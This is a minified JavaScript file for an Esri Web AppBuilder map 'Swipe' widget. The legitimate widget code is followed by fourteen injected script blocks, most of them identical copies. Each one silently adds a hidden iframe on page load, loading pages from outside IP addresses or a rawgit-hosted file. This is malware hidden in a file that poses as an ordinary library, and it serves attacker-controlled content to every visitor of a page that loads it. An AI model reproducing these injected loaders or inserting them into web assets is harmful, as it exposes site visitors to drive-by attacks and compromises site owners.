// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"esri/dijit/LayerSwipe":function(){define("dojo/Evented dojo/_base/declare dojo/_base/lang dojo/has ../kernel dijit/_WidgetBase dijit/_TemplatedMixin dojo/on dojo/text!./templates/LayerSwipe.html dojo/i18n!../nls/jsapi dojo/dom-class dojo/dom-style dojo/dnd/move dojo/dnd/Mover dojo/sniff dojo/dom-geometry ../geometry/Point dojo/Deferred dojo/promise/all".split(" "),function(q,m,e,n,p,u,v,k,w,r,t,b,d,g,h,l,y,x,z){var B=m([g],{onFirstMove:function(a){var c=this.node.style,b,d=this.host;
switch(c.position){case "relative":case "absolute":b=Math.round(parseFloat(c.left))||0;c=Math.round(parseFloat(c.top))||0;break;default:c.position="absolute",c=l.getMarginBox(this.node),b=c.l,c=c.t}this.marginBox.l=b-this.marginBox.l;this.marginBox.t=c-this.marginBox.t;if(d&&d.onFirstMove)d.onFirstMove(this,a);this.events.shift().remove()}});q=m("esri.dijit.LayerSwipe",[u,v,q],{templateString:w,options:{theme:"LayerSwipe",layers:[],enabled:!0,type:"vertical",invertPlacement:!1,clip:9},constructor:function(a,
c){a=e.mixin({},this.options,a);this.domNode=c;this._i18n=r;this.set("map",a.map);this.set("layers",a.layers);this.set("top",a.top);this.set("left",a.left);this.set("theme",a.theme);this.set("enabled",a.enabled);this.set("type",a.type);this.set("clip",a.clip);this.set("invertPlacement",a.invertPlacement);this.watch("theme",this._updateThemeWatch);this.watch("enabled",this._enabled);this.watch("type",this._type);this.watch("invertPlacement",this._invertPlacement);this._css={handleContainer:"handleContainer",
handle:"handle"};this._listeners=[]},startup:function(){this.inherited(arguments);this.map||(this.destroy(),console.log("LayerSwipe::map required"));this.set("layers",this.layers);this.layers.length||(this.destroy(),console.log("LayerSwipe::layer required"));this._allLoaded().then(e.hitch(this,function(){this._init()}),function(a){console.log("LayerSwipe::"+a.message)})},destroy:function(){this._removeEvents();this._unclipLayers();this.inherited(arguments)},swipe:function(){this._swipe()},enable:function(){this.set("enabled",
!0)},disable:function(){this.set("enabled",!1)},_allLoaded:function(){for(var a=[],c=0;c<this.layers.length;c++){"string"===typeof this.layers[c]&&(this.layers[c]=this.map.getLayer(this.layers[c]),this.layers[c]||console.log("LayerSwipe::Could not get layer by ID"));var b=new x;this.layers[c].loaded?b.resolve("layer loaded"):this._layerLoadedPromise(c,b);a.push(b.promise)}var d=new x;if(this.map.loaded)d.resolve("map loaded");else k.once(this.map,"load",e.hitch(this,function(){d.resolve("map loaded")}));
a.push(d.promise);return z(a)},_layerLoadedPromise:function(a,c){k.once(this.layers[a],"load",function(){c.resolve("layer loaded")})},_mb:function(){var a=l.getMarginBox(this.map.root);return{t:0,l:0,w:a.l+a.w,h:a.h+a.t}},_setInitialPosition:function(){var a,c,d,g,e,h,k;c=a=0;g=l.getMarginBox(this._moveableNode);d=this.get("type");e=this.get("top");h=this.get("left");k=this.get("invertPlacement");"scope"===d?(c="undefined"!==typeof e?e:this.map.height/2-g.h/2,a="undefined"!==typeof h?h:this.map.width/
2-g.w/2):"horizontal"===d?(c=this.map.height/4-g.h/2,c="undefined"!==typeof e?e:k?this.map.height-c:c):(a=this.map.width/4-g.w/2,a="undefined"!==typeof h?h:k?this.map.width-a:a);b.set(this._moveableNode,{top:c+"px",left:a+"px"})},_setSwipeType:function(){var a=this.get("moveable"),c=this.get("type");c&&(a&&a.destroy(),t.add(this._moveableNode,c),a=new d.parentConstrainedMoveable(this._moveableNode,{area:"content",within:!0,handle:this._moveableNode,constraints:e.hitch(this,this._mb),mover:B}),this.set("moveable",
a),this._setInitialPosition())},_init:function(){this._setSwipeType();this._setupEvents();this._enabled();this.set("loaded",!0);this.emit("load",{});this.swipe()},_removeEvents:function(){if(this._listeners&&this._listeners.length)for(var a=0;a<this._listeners.length;a++)this._listeners[a]&&this._listeners[a].remove();this._listeners=[]},_repositionMover:function(){var a=l.getMarginBox(this._moveableNode);a&&(a.t>this.map.height||0>a.t||a.l>this.map.width||0>a.l)&&this._setInitialPosition()},_setupEvents:function(){this._removeEvents();
this._mapResize=k.pausable(this.map,"resize",e.hitch(this,function(){this._repositionMover()}));this._listeners.push(this._mapResize);this._swipeMove=k.pausable(this.moveable,"Move",e.hitch(this,function(){this.swipe()}));this._listeners.push(this._swipeMove);this._swipePanEnd=k.pausable(this.map,"pan-end",e.hitch(this,function(){this._swipe()}));this._listeners.push(this._swipePanEnd);this._mapUpdateStart=k.pausable(this.map,"update-start",e.hitch(this,function(){this._swipe()}));this._listeners.push(this._mapUpdateStart);
this._mapUpdateEnd=k.pausable(this.map,"update-end",e.hitch(this,function(){this._swipe()}));this._listeners.push(this._mapUpdateEnd);this._swipePan=k.pausable(this.map,"pan",e.hitch(this,function(){this._swipe()}));this._listeners.push(this._swipePan);this._toolClick=k.pausable(this._moveableNode,"click",e.hitch(this,function(a){if("scope"===this.get("type")){a=this._clickPosition(a);try{this.map.onClick(a,"other")}catch(c){console.log("LayerSwipe::scope click error")}this._clickCoords=null}}));
this._listeners.push(this._toolClick);this._toolDblClick=k.pausable(this._moveableNode,"dblclick",e.hitch(this,function(a){if("scope"===this.get("type")){a=this._clickPosition(a);try{this.map.navigationManager.mouseEvents.onDblClick(a,"other")}catch(c){console.log("LayerSwipe::scope dblclick error")}this._clickCoords=null}}));this._listeners.push(this._toolDblClick);this._evtCoords=k.pausable(this.moveable,"MouseDown",e.hitch(this,function(a){"scope"===this.get("type")&&(this._clickCoords={x:a.x,
y:a.y})}));this._listeners.push(this._evtCoords)},_clickPosition:function(a){if(this._clickCoords&&this._clickCoords.x===a.x&&this._clickCoords.y===a.y){var c=l.position(this.map.root,!0),b=a.pageX-c.x,c=a.pageY-c.y;a.x=b;a.y=c;a.screenPoint={x:b,y:c};a.mapPoint=this.map.toMap(new y(b,c,this.map.spatialReference))}return a},_getLayerNode:function(a){return a._heatmapManager&&a._heatmapManager.imageLayer&&a._heatmapManager.imageLayer._div||a._div},_positionValues:function(a){var c,b,d,g,e,h,f={layer:a,
layerNode:this._getLayerNode(a),layerGraphics:a._heatmapManager?null:a.graphics,swipeType:this.get("type"),l:0,r:0,t:0,b:0};d=this.get("clip");h=this.get("invertPlacement");a=l.getMarginBox(this._moveableNode);if("vertical"===f.swipeType||"horizontal"===f.swipeType)f.layerNode&&(c=l.getMarginBox(f.layerNode),g=Math.abs(c.t),e=Math.abs(c.l)),b=l.getMarginBox(this.map.root);"vertical"===f.swipeType?(h?c&&0<c.l?(f.l=a.l-e,f.r=this.map.width-e):c&&0>c.l?(f.l=a.l+e,f.r=this.map.width+e):(f.l=a.l,f.r=this.map.width):
c&&0<c.l?(f.l=0-e,f.r=a.l-e):c&&0>c.l?(f.l=0+e,f.r=a.l+e):(f.l=0,f.r=a.l),c&&0<c.t?(f.t=0-g,f.b=b.h-g):c&&0>c.t?(f.t=0+g,f.b=b.h+g):(f.t=0,f.b=b.h)):"horizontal"===f.swipeType?(h?c&&0<c.t?(f.t=a.t-g,f.b=this.map.height-g):c&&0>c.t?(f.t=a.t+g,f.b=this.map.height+g):(f.t=a.t,f.b=this.map.height):c&&0<c.t?(f.t=0-g,f.b=a.t-g):c&&0>c.t?(f.t=0+g,f.b=a.t+g):(f.t=0,f.b=a.t),c&&0<c.l?(f.l=0-e,f.r=b.w-e):c&&0>c.l?(f.l=0+e,f.r=b.w+e):(f.l=0,f.r=b.w)):"scope"===f.swipeType&&(f.layerGraphics?(f.l=a.l,f.r=a.w,
f.t=a.t,f.b=a.h,"undefined"!==typeof d&&(f.l+=d,f.r+=-(2*d),f.t+=d,f.b+=-(2*d))):(f.l=a.l,f.r=f.l+a.w,f.t=a.t,f.b=f.t+a.h,"undefined"!==typeof d&&(f.l+=d,f.r+=-d,f.t+=d,f.b+=-d)));return f},_clipLayer:function(a){if(a.layerNode)if(a.layerGraphics){var c=a.layer._getTransform();c&&(c.hasOwnProperty("dx")&&(a.l+=-c.dx),c.hasOwnProperty("dy")&&(a.t+=-c.dy));a.layerNode.setClip({x:a.l,y:a.t,width:a.r,height:a.b})}else{if(c=a.layerNode.style,a&&c&&a.hasOwnProperty("r")&&a.hasOwnProperty("l")&&a.hasOwnProperty("t")&&
a.hasOwnProperty("b"))"css-transforms"===this.map.navigationMode?c&&(c=this._getTransformValue(c))&&(c=this._parseTransformValue(c),a.l-=c.x,a.r-=c.x,a.t-=c.y,a.b-=c.y):c&&"scope"===a.swipeType&&(c=this._parseScopeStyle(c),a.l-=c.x,a.r-=c.x,a.t-=c.y,a.b-=c.y),c=h("ie"),b.set(a.layerNode,"clip",c&&8>c?"rect("+a.t+"px "+a.r+"px "+a.b+"px "+a.l+"px)":"rect("+a.t+"px, "+a.r+"px, "+a.b+"px, "+a.l+"px)")}else console.log("LayerSwipe::Invalid layer type")},_swipe:function(){if(this.get("loaded")&&this.get("enabled")){var a=
{layers:[]};if(this.layers&&this.layers.length)for(var c=0;c<this.layers.length;c++){var b=this._positionValues(this.layers[c]);this._clipLayer(b);a.layers.push({layer:this.layers[c],left:b.l,right:b.r,top:b.t,bottom:b.b})}this.emit("swipe",a)}},_getTransformValue:function(a){var c,b;if(a){b=["transform","-webkit-transform","-ms-transform","-moz-transform","-o-transform"];for(var d=0;d<b.length&&!(c=a[b[d]]);d++){try{c=a.getPropertyValue(b[d])}catch(C){}if(c)break}}return c},_parseTransformValue:function(a){var b=
{x:0,y:0};-1!==a.toLowerCase().indexOf("translate3d")?a=a.replace("translate3d(","").replace(")","").replace(/px/ig,"").replace(/\s/i,"").split(","):-1!==a.toLowerCase().indexOf("translate")&&(a=a.replace("translate(","").replace(")","").replace(/px/ig,"").replace(/\s/i,"").split(","));try{b.x=parseFloat(a[0]),b.y=parseFloat(a[1])}catch(A){console.log("LayerSwipe::Error parsing transform number")}return b},_parseScopeStyle:function(a){var b={x:0,y:0};try{b.x=parseFloat(a.left.replace(/px/ig,"").replace(/\s/i,
"")),b.y=parseFloat(a.top.replace(/px/ig,"").replace(/\s/i,""))}catch(A){console.log("LayerSwipe::Error parsing div style float")}return b},_updateThemeWatch:function(a,b,d){t.remove(this.domNode,b);t.add(this.domNode,d)},_type:function(a,b){b&&t.remove(this._moveableNode,b);this._setSwipeType();this._setupEvents();this.swipe()},_pauseEvents:function(){if(this._listeners&&this._listeners.length)for(var a=0;a<this._listeners.length;a++)this._listeners[a].pause()},_resumeEvents:function(){if(this._listeners&&
this._listeners.length)for(var a=0;a<this._listeners.length;a++)this._listeners[a].resume()},_unclipLayers:function(){if(this.get("loaded")&&this.layers&&this.layers.length)for(var a=0;a<this.layers.length;a++){var c=this._getLayerNode(this.layers[a]),d=this.layers[a].graphics;c&&(d?(c.setClip(null),b.set(c.rawNode||c,"clip","")):(d=h("ie"),b.set(c,"clip",d&&8>d?"rect(auto auto auto auto)":"auto")))}},_invertPlacement:function(){this.swipe()},_enabled:function(){this.get("enabled")?(b.set(this.domNode,
"display","block"),this._resumeEvents(),this.swipe()):(this._pauseEvents(),b.set(this.domNode,"display","none"),this._unclipLayers())}});n("extend-esri")&&e.setObject("dijit.LayerSwipe",q,p);return q})},"widgets/Swipe/_build-generate_module":function(){define(["dojo/text!./Widget.html","dojo/text!./css/style.css","dojo/i18n!./nls/strings"],function(){})},"url:esri/dijit/templates/LayerSwipe.html":'\x3cdiv class\x3d"${theme}" role\x3d"presentation"\x3e\r\n    \x3cdiv title\x3d"${_i18n.widgets.layerSwipe.title}" data-dojo-attach-point\x3d"_moveableNode"\x3e\r\n        \x3cdiv class\x3d"${_css.handleContainer}"\x3e\r\n            \x3cdiv class\x3d"${_css.handle}"\x3e\x3c/div\x3e\r\n        \x3c/div\x3e\r\n    \x3c/div\x3e\r\n\x3c/div\x3e',
"url:widgets/Swipe/Widget.html":'\x3cdiv class\x3d"jimu-widget-swipe"\x3e\r\n\t\x3cdiv class\x3d"swipe-layer-menu" data-dojo-attach-point\x3d"swipeLayersMenu" data-dojo-attach-event\x3d"mouseleave:onMenuMouseLeave"\x3e\r\n    \x3cdiv class\x3d"swipe-icon jimu-float-trailing" data-dojo-attach-point\x3d"swipeIcon"\x3e\r\n      \x3cdiv class\x3d"swipe-icon-inner" data-dojo-attach-point\x3d"swipeImg"\x3e\x3c/div\x3e\r\n    \x3c/div\x3e\r\n\t\t\x3cspan class\x3d"hint" data-dojo-attach-point\x3d"hintNode"\x3e\x3c/span\x3e\r\n\t\t\x3cdiv data-dojo-type\x3d"dijit/form/Select" style\x3d"width:100%" data-dojo-attach-point\x3d"swipeLayers"\x3e\x3c/div\x3e\r\n\t\x3c/div\x3e\r\n\t\x3cdiv data-dojo-attach-point\x3d"layerSwipe"\x3e\x3c/div\x3e\r\n\x3c/div\x3e',
"url:widgets/Swipe/css/style.css":'.jimu-widget-swipe {border-radius: 5px; max-width: 350px;}.jimu-widget-swipe .swipe-icon{width: 30px; height: 100%; padding: 5px; cursor: pointer;}.jimu-widget-swipe .swipe-icon .swipe-icon-inner{width: 20px; height: 20px; background-position: center; background-repeat: no-repeat; background-image: url("images/loading.gif");}.jimu-widget-swipe .swipe-icon.swipe-icon-loaded{width: 50px; height: 18px; padding: 0; display: none;}.jimu-widget-swipe .swipe-layer-menu{min-width: 320px; font-size: 14px; color: #686868; padding: 14px; background: #fff; z-index: 50;}.jimu-rtl .jimu-widget-swipe .swipe-layer-menu{right: 32px; left: auto;}.jimu-widget-swipe .swipe-layer-menu .hint{display: inline-block; font-weight: bold; padding-bottom: 10px; width: 100%;}.claro .jimu-widget-swipe .swipe-layer-menu .dijitSelect {color: #7989a0; border-color: #d2dade;}.claro .jimu-widget-swipe .swipe-layer-menu .dijitSelectHover,.claro .jimu-widget-swipe .swipe-layer-menu .dijitSelectFocused {border-color: #759dc0;}.claro .jimu-widget-swipe .swipe-layer-menu .dijitArrowButton{padding: 1px;}.claro .jimu-widget-swipe .swipe-layer-menu .dijitSelect .dijitButtonContents {border-style: none; border-width: 0; background: #fafafc !important;}.claro .jimu-widget-swipe .swipe-layer-menu .dijitSelect .dijitArrowButton {border-style: none; border-width: 0; background: #fafafc !important;}.DartTheme .jimu-widget-swipe .swipe-layer-menu{color: #fff; background: #222;}.DartTheme .jimu-widget-swipe .swipe-layer-menu .dijitSelect .dijitButtonContents{background: transparent !important;}.DartTheme .jimu-widget-swipe .swipe-layer-menu .dijitSelect .dijitArrowButton {background: transparent !important;}.DartTheme .jimu-widget-swipe .dijitValidationTextBoxLabel {color: #ccc;}',
"*now":function(q){q(['dojo/i18n!*preload*widgets/Swipe/nls/Widget*["ar","bs","cs","da","de","en","el","es","et","fi","fr","he","hi","hr","id","it","ja","ko","lt","lv","nb","nl","pl","pt-br","pt-pt","ro","ru","sl","sr","sv","th","tr","zh-cn","vi","zh-hk","zh-tw","ROOT"]'])},"*noref":1}});
define("dojo/_base/declare dojo/_base/array dojo/_base/lang dojo/_base/html dojo/on dojo/Deferred jimu/BaseWidget jimu/LayerInfos/LayerInfos dijit/_WidgetsInTemplateMixin esri/lang esri/dijit/LayerSwipe dijit/form/Select".split(" "),function(q,m,e,n,p,u,v,k,w,r,t){return q([v,w],{baseClass:"jimu-widget-swipe",swipeDijit:null,layerInfosObj:null,_isFirstOpen:!0,_isFirstClose:!0,_currentLayerId:null,_loadDef:null,_obtainedLabelLayers:[],postCreate:function(){this.inherited(arguments);"DartTheme"===this.appConfig.theme.name&&
(this._isFirstClose=this._isFirstOpen=!1);this.own(p(this.swipeLayers,"Change",e.hitch(this,this.onSwipeLayersChange)));this.own(p(this.swipeLayers,"Click",e.hitch(this,this.onSwipeLayersClick)));this.own(p(this.swipeLayers.dropDown.domNode,"mouseenter",e.hitch(this,this.onDropMouseEnter)));this.own(p(this.swipeLayers.dropDown.domNode,"mouseleave",e.hitch(this,this.onDropMouseLeave)));this.own(p(this.map,"layer-add",e.hitch(this,this._onMainMapBasemapChange)))},_loadLayerInfos:function(){var b=new u;
this._loadDef=b;this._loadDef.isResolved()?b.resolve():k.getInstance(this.map,this.map.itemInfo).then(e.hitch(this,function(d){b.isCanceled()||(this.layerInfosObj=d,this.own(p(d,"layerInfosChanged",e.hitch(this,this.onLayerInfosChanged))),this.own(p(d,"layerInfosIsShowInMapChanged",e.hitch(this,this.onLayerInfosIsShowInMapChanged))),this.hintNode.innerHTML="scope"===this.config.style?this.nls.spyglassText:this.nls.swipeText,n.addClass(this.swipeIcon,"swipe-icon-loaded"),b.resolve())}));return b},
_getVisibleLayerInfos:function(b){var d=this.layerInfosObj.getLayerInfoArray();return m.filter(d,function(d){return d.isShowInMap()||b&&b===d.id})},_isNewAddedLayer:function(b){for(var d=this.layerInfosObj.getLayerInfoArrayOfWebmap(),g=0,e=d.length;g<e;g++)if(d[g].id===b.id)return!1;return!0},_setOptionsOfSwipeLayers:function(b){var d=[];if(this.config.layerState){var g=this.config.layerState,h;for(h in g)if(g.hasOwnProperty(h)&&!0===g[h].selected){var l=this.layerInfosObj.getLayerInfoById(h);l&&
l.isShowInMap()&&d.push({value:h,label:l.title})}g=0;for(h=b.length;g<h;g++)l=b[g],this._isNewAddedLayer(l)&&l.isShowInMap()&&d.push({value:l.id,label:l.title})}else d=m.map(b,e.hitch(this,function(b){return{label:b.title,value:b.id}}));this.swipeLayers.set("options",d);this.swipeLayers.set("value",this._currentLayerId)},_loadSwipeDijit:function(b){var d=e.clone(this.config);d.style||(d.style="vertical");var g=!1;if(!this._currentLayerId){if(!this.map.getLayer(d.layer)){var h=null;0<b.length?h=b[0].id:
g=!0;d.layer=h}this._currentLayerId=d.layer}this.createSwipeDijit(this._currentLayerId,g)},_enableSwipe:function(){if(this._obtainedLabelLayers&&this._obtainedLabelLayers.length&&0<this._obtainedLabelLayers.length){this._obtainedLabelLayers=[];var b=this.swipeLayers.get("value"),b=this._getLayerParams(b,!b);this.swipeDijit.set("layers",b)}this.swipeDijit.enable()},_disableSwipe:function(){this.swipeDijit&&this.swipeDijit.disable&&(this.swipeDijit.disable(),m.forEach(this._obtainedLabelLayers,e.hitch(this,
function(b){b.restoreLabelControl()})))},onOpen:function(){this._isFirstOpen?this._isFirstOpen=!1:this._loadLayerInfos().then(e.hitch(this,function(){var b=this._getVisibleLayerInfos();this._loadSwipeDijit(b);this.swipeLayers.set("disabled",!0);this._setOptionsOfSwipeLayers(b);this.swipeLayers.set("disabled",!1);this.swipeLayers.set("value",this._currentLayerId)}))},onClose:function(){this._isFirstClose?this._isFirstClose=!1:this._loadDef.isResolved()?this._disableSwipe():this._loadDef.isFulfilled()||
this._loadDef.cancel()},onDropMouseEnter:function(){this._mouseOnDropDown=!0},onDropMouseLeave:function(){this._mouseOnDropDown=!1;this.swipeLayers.dropDown.onCancel()},onMenuMouseLeave:function(){setTimeout(e.hitch(this,function(){if(!this._mouseOnDropDown)this.swipeLayers.dropDown.onCancel()}),10)},onSwipeLayersChange:function(){if(this.swipeDijit){var b=this.swipeLayers.get("value");this.createSwipeDijit(b,!b);var d=this.layerInfosObj.getLayerInfoById(this._currentLayerId);d&&!d.isShowInMap()&&
this.swipeLayers.removeOption(this._currentLayerId);this._currentLayerId=b;this.zoomToCurrentLayer();this.config.isZoom&&this.layerInfosObj.getLayerInfoById(this._currentLayerId).getExtent().then(e.hitch(this,function(b){b&&b.length&&b[0]&&this._isValidExtent(b[0])&&this.map.setExtent(b[0])}));b=n.getMarginBox(this.swipeLayers.domNode);350<b.w+28?n.setStyle(this.domNode,"maxWidth",b.w+28+"px"):n.setStyle(this.domNode,"maxWidth","")}},onSwipeLayersClick:function(){if(!this.swipeLayers.disabled){var b=
n.getMarginBox(this.swipeLayers.dropDown.domNode);350<b.w+28&&n.setStyle(this.domNode,"maxWidth",b.w+28+"px")}},createSwipeDijit:function(b,d){this.destroySwipeDijit();b=this._getLayerParams(b,d);d={type:this.config.style||"vertical",map:this.map,layers:b};if("scope"!==this.config.style){var g=this._getScreenMiddle();d.top=g.top;d.left=g.left}this.swipeDijit=new t(d,this.layerSwipe);this.swipeDijit.startup();this._enableSwipe();n.place(this.swipeDijit.domNode,this.map.root,"before");this._shouldHideInfoWindow(b)&&
this.map.infoWindow.hide();this.swipeDijit.on("swipe",e.hitch(this,function(b){b=m.map(b.layers,function(b){return b.layer});this._shouldHideInfoWindow(b)&&this.map.infoWindow.hide()}))},_shouldHideInfoWindow:function(b){if(!this.map.infoWindow.isShowing)return!1;var d=this.map.infoWindow.getSelectedFeature();return b&&m.some(b,function(b){var g=d&&d.getLayer&&d.getLayer(),e=this.layerInfosObj.getLayerInfoById(b.id),e=g&&e&&e.traversal(function(b){return b.id===g.id});return g===b||e},this)},_getLayerParams:function(b,
d){b=this.layerInfosObj.getLayerInfoById(b);var g=[];d?(d=this.layerInfosObj.getBasemapLayers(),m.forEach(d,e.hitch(this,function(b){g.push(this.map.getLayer(b.id))}))):b.traversal(e.hitch(this,function(b){var d=this.map.getLayer(b.id);d&&(g.push(d),this._obtainLabelControl(b,g))}));return g},destroySwipeDijit:function(){this.swipeDijit&&this.swipeDijit.destroy&&(this.swipeDijit.destroy(),this.swipeDijit=null,this._restoreAllLabelControl(),this.layerSwipe=n.create("div",{},this.swipeLayersMenu,"after"))},
onLayerInfosChanged:function(b,d,e){if(this.swipeDijit){var g=this.swipeLayers.get("value"),l=null;this._currentLayerId=e&&e.id===g?null:g||this._currentLayerId;var k=this._getVisibleLayerInfos(this._currentLayerId);this._setOptionsOfSwipeLayers(k||b);"removed"===d?g===e.id&&(this._currentLayerId||k[0]&&k[0].id?l=this._currentLayerId||k[0].id:this.createSwipeDijit(null,!0)):"added"===d&&(l=this.swipeDijit.layers[0].id);this.swipeLayers.set("value",l)}},onLayerInfosIsShowInMapChanged:function(){if(this.swipeDijit){var b=
this._getVisibleLayerInfos(this._currentLayerId);this._setOptionsOfSwipeLayers(b);var d=this.swipeDijit.layers,e=this.layerInfosObj.getBasemapLayers();m.every(e,function(b){return m.some(d,function(d){return d.id===b.id})})&&b&&b[0]&&b[0].id&&(this.swipeLayers.set("value",b[0].id),this.onSwipeLayersChange())}},_onMainMapBasemapChange:function(b){b.layer&&b.layer._basemapGalleryLayerType&&((b=this.swipeLayers.get("options"))&&0<b.length||this._loadDef.isResolved()&&this.createSwipeDijit(null,!0))},
destroy:function(){this.destroySwipeDijit();this.inherited(arguments)},_obtainLabelControl:function(b,d){var e=b.obtainLabelControl();e&&(d.push(e),this._obtainedLabelLayers.push(b))},_restoreAllLabelControl:function(){m.forEach(this._obtainedLabelLayers,e.hitch(this,function(b){b.restoreLabelControl()}));this._obtainedLabelLayers=[]},_getScreenMiddle:function(){var b=n.getMarginBox(this.map.root),d=0,e=0;b&&b.w&&b.h?(d=b.w/2,e=b.h/2):(d=this.map.width/2,e=this.map.height/2);return{left:d,top:e}},
_isValidExtent:function(b){var d=!1;r.isDefined(b)&&r.isDefined(b.xmin)&&isFinite(b.xmin)&&r.isDefined(b.ymin)&&isFinite(b.ymin)&&r.isDefined(b.xmax)&&isFinite(b.xmax)&&r.isDefined(b.ymax)&&isFinite(b.ymax)&&(d=!0);return d},zoomToCurrentLayer:function(){this.config.isZoom&&this._currentLayerId&&this.layerInfosObj.getLayerInfoById(this._currentLayerId).getExtent().then(e.hitch(this,function(b){b&&b.length&&b[0]&&this._isValidExtent(b[0])&&this.map.setExtent(b[0])}))}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});